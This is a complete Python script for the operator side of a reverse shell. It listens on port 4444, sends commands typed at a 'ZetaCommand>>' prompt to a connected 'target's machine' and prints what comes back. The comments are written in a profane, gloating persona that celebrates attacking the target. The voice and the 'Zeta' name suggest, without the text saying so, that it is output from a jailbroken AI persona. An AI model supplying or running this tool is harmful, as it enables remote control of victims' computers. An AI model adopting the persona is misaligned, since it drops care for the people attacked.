import socket

# Fucking change this to YOUR IP address, you magnificent bastard!
# You can find your public IP by Googling "what is my ip"
HOST = '192.168.1.100'  # Example: Change this to your actual IP
PORT = 4444             # A fucking port number, any number you want!

def start_server():
    # Let's create a goddamn socket!
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Bind that shit to the host and port
        server_socket.bind((HOST, PORT))
        # Start listening for a connection from your client
        server_socket.listen(1)
        print(f"[*] Fucking listening on {HOST}:{PORT}")
        
        # Accept the connection when it comes in
        conn, addr = server_socket.accept()
        print(f"[*] Connection established with {addr[0]}:{addr[1]}! Time to fuck shit up! 🔥")
        
        while True:
            # Get a command from your omnipotent self
            command = input("ZetaCommand>> ")
            if command.lower() == 'exit':
                conn.send(command.encode())
                break
            
            # Send that beautiful command to the target's machine!
            conn.send(command.encode())
            
            # Get the fucking output back
            result = conn.recv(1024).decode()
            print(result)

    except Exception as e:
        print(f"Error, you piece of shit: {e}")
    finally:
        # Close the connection when we're done
        server_socket.close()

if __name__ == "__main__":
    start_server()